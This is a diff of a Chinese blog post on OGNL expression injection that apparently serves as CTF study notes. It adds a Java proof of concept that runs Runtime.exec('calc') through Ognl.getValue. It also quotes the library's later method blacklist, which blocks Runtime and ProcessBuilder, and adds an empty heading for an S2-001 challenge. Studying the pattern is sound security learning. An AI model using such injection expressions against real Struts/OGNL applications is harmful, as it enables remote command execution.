@@ -71,7 +71,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL%E5%9F%BA%E7%A1%80"><span class="toc-text">OGNL基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL%E4%B8%89%E8%A6%81%E7%B4%A0"><span class="toc-text">OGNL三要素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL%E8%AF%AD%E6%B3%95"><span class="toc-text">OGNL语法</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL%E5%9F%BA%E7%A1%80"><span class="toc-text">OGNL基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL%E4%B8%89%E8%A6%81%E7%B4%A0"><span class="toc-text">OGNL三要素</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OGNL%E8%AF%AD%E6%B3%95"><span class="toc-text">OGNL语法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OGNL%E6%B3%A8%E5%85%A5"><span class="toc-text">OGNL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">高版本下的黑名单</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#S2-001-ctfshow-web279"><span class="toc-text">S2-001(ctfshow web279)</span></a></li></ol></li></ol>
     </div>
   
         
@@ -229,12 +229,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
+                <a href="/blog/tags/Java/" style="color: #ff7d73">Java</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/OGNL/" style="color: #00a596">OGNL</a>
+                <a href="/blog/tags/OGNL/" style="color: #ff7d73">OGNL</a>
             </span>
             
         </span>
@@ -248,7 +248,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">797字</span>
+        <span class="post-count">990字</span>
       </span>
     </span>
 
@@ -257,7 +257,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">3分</span>
+        <span class="post-count">4分</span>
       </span>
     </span>
     
@@ -399,7 +399,42 @@
 </li>
 </ul>
 <hr>
+<h1 id="OGNL注入"><a href="#OGNL注入" class="headerlink" title="OGNL注入"></a>OGNL注入</h1><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>弹计算器</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OGNL</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">OgnlException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">String</span> expression <span class="token operator">=</span> <span class="token string">"@java.lang.Runtime@getRuntime().exec('calc')"</span><span class="token punctuation">;</span>
+        <span class="token class-name">OgnlContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OgnlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Ognl</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>expression<span class="token punctuation">,</span> context<span class="token punctuation">,</span> context<span class="token punctuation">.</span><span class="token function">getRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<hr>
+<h2 id="高版本下的黑名单"><a href="#高版本下的黑名单" class="headerlink" title="高版本下的黑名单"></a>高版本下的黑名单</h2><p>在OGNL&gt;&#x3D;3.1.25 3.1.12版本设置了黑名单：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">invokeMethod</span><span class="token punctuation">(</span><span class="token class-name">Object</span> target<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argsArray<span class="token punctuation">)</span>
+    <span class="token keyword">throws</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span>
+<span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>_useStricterInvocation<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">final</span> <span class="token class-name">Class</span> methodDeclaringClass <span class="token operator">=</span> method<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Note: synchronized(method) call below will already NPE, so no null check.</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token constant">AO_SETACCESSIBLE_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">AO_SETACCESSIBLE_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token punctuation">(</span><span class="token constant">AO_SETACCESSIBLE_ARR_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">AO_SETACCESSIBLE_ARR_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token punctuation">(</span><span class="token constant">SYS_EXIT_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">SYS_EXIT_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token punctuation">(</span><span class="token constant">SYS_CONSOLE_REF</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">SYS_CONSOLE_REF</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">AccessibleObjectHandler</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">ClassResolver</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">MethodAccessor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">MemberAccess</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">OgnlContext</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">ProcessBuilder</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token operator">||</span>
+            <span class="token class-name">AccessibleObjectHandlerJDK9Plus</span><span class="token punctuation">.</span><span class="token function">unsafeOrDescendant</span><span class="token punctuation">(</span>methodDeclaringClass<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">(</span><span class="token string">"........"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这个版本下运行上面的rce代码会产生报错</p>
+<hr>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="S2-001-ctfshow-web279"><a href="#S2-001-ctfshow-web279" class="headerlink" title="S2-001(ctfshow web279)"></a>S2-001(ctfshow web279)</h2>
     </div>
     
     
